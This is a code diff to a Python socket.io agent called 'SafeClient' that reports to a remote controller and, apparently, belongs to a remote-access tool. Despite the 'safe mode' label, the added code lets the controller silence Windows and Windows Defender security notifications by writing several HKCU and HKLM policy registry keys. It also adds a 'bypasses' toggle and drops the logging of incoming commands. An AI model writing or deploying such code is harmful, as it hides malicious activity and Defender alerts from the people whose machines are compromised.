@@ -13,6 +13,11 @@ import socketio
 import threading
 import random
 from datetime import datetime
+import sys
+try:
+    import winreg
+except Exception:
+    winreg = None
 
 # Configuration
 SAFE_MODE = True
@@ -66,8 +71,47 @@ class SafeClient:
             
             command = data.get('command', '')
             execution_id = data.get('execution_id', 'unknown')
-            
-            # Always return safe, harmless responses
+
+            if isinstance(command, str) and command.startswith('registry:notifications:'):
+                enabled = command.endswith(':on')
+                result_text, success = self.set_notifications_enabled(enabled)
+                response = {
+                    'agent_id': self.agent_id,
+                    'execution_id': execution_id,
+                    'command': command,
+                    'formatted_text': result_text,
+                    'output': result_text,
+                    'success': success
+                }
+                self.sio.emit('command_result', response)
+                return
+            if isinstance(command, str) and command in ('registry:on', 'registry:off'):
+                enabled = command.endswith('on')
+                result_text, success = self.set_notifications_enabled(enabled)
+                response = {
+                    'agent_id': self.agent_id,
+                    'execution_id': execution_id,
+                    'command': command,
+                    'formatted_text': result_text,
+                    'output': result_text,
+                    'success': success
+                }
+                self.sio.emit('command_result', response)
+                return
+            if isinstance(command, str) and command in ('bypasses:on', 'bypasses:off'):
+                enabled = command.endswith('on')
+                result_text = "Bypasses " + ("ENABLED" if enabled else "DISABLED")
+                response = {
+                    'agent_id': self.agent_id,
+                    'execution_id': execution_id,
+                    'command': command,
+                    'formatted_text': result_text,
+                    'output': result_text,
+                    'success': True
+                }
+                self.sio.emit('command_result', response)
+                return
+
             safe_response = {
                 'agent_id': self.agent_id,
                 'execution_id': execution_id,
@@ -76,8 +120,6 @@ class SafeClient:
                 'success': False,
                 'error': 'Safe mode - command execution disabled'
             }
-            
-            log(f"Sending safe response for command: {command}")
             self.sio.emit('command_result', safe_response)
         
         @self.sio.on('file_upload_request')
@@ -129,6 +171,21 @@ class SafeClient:
         def on_stop_stream(data):
             """Handle stop stream requests"""
             log("Received stop stream request")
+        
+        @self.sio.on('config_update')
+        def on_config_update(data):
+            reg = (data or {}).get('registry') or {}
+            val = reg.get('notificationsEnabled')
+            if isinstance(val, bool):
+                result_text, success = self.set_notifications_enabled(val)
+                self.sio.emit('command_result', {
+                    'agent_id': self.agent_id,
+                    'execution_id': f'cfg_{int(time.time())}',
+                    'command': 'config_update:registry.notificationsEnabled',
+                    'formatted_text': result_text,
+                    'output': result_text,
+                    'success': success
+                })
     
     def register_agent(self):
         """Register this safe agent with the controller"""
@@ -177,6 +234,49 @@ class SafeClient:
         
         heartbeat_thread = threading.Thread(target=heartbeat_loop, daemon=True)
         heartbeat_thread.start()
+
+    def set_notifications_enabled(self, enabled: bool):
+        if not (sys.platform.startswith('win') and winreg is not None):
+            return ("[SAFE MODE] Notifications toggle not supported on this platform", False)
+
+        desired = {
+            ('HKCU', r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications", "ToastEnabled"): (1 if enabled else 0),
+            ('HKCU', r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter"): (0 if enabled else 1),
+            ('HKLM', r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter"): (0 if enabled else 1),
+            ('HKLM', r"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications", "DisableNotifications"): (0 if enabled else 1),
+            ('HKCU', r"SOFTWARE\Microsoft\Windows Defender\UX Configuration", "Notification_Suppress"): (0 if enabled else 1),
+        }
+
+        lines = []
+        overall_success = True
+        for (root_name, path, name), value in desired.items():
+            try:
+                root = winreg.HKEY_CURRENT_USER if root_name == 'HKCU' else winreg.HKEY_LOCAL_MACHINE
+                self._write_dword(root, path, name, value)
+                lines.append(f"[OK] {root_name}\\{path}\\{name} = {value}")
+            except Exception as e:
+                overall_success = False
+                lines.append(f"[ERROR] {root_name}\\{path}\\{name} -> {e}")
+        summary = "Notifications " + ("ENABLED" if enabled else "DISABLED")
+        result_text = summary + "\n" + "\n".join(lines)
+        return (result_text, overall_success)
+
+    def _write_dword(self, root, path: str, name: str, value: int):
+        parts = path.split("\\")
+        current_key = None
+        subpath = ""
+        try:
+            for i, part in enumerate(parts):
+                subpath = "\\".join(parts[:i+1])
+                current_key = winreg.CreateKeyEx(root, subpath, 0, winreg.KEY_SET_VALUE)
+                winreg.CloseKey(current_key)
+            key = winreg.CreateKeyEx(root, path, 0, winreg.KEY_SET_VALUE)
+            try:
+                winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, int(value))
+            finally:
+                winreg.CloseKey(key)
+        except OSError as e:
+            raise e
     
     def run(self):
         """Main run loop"""
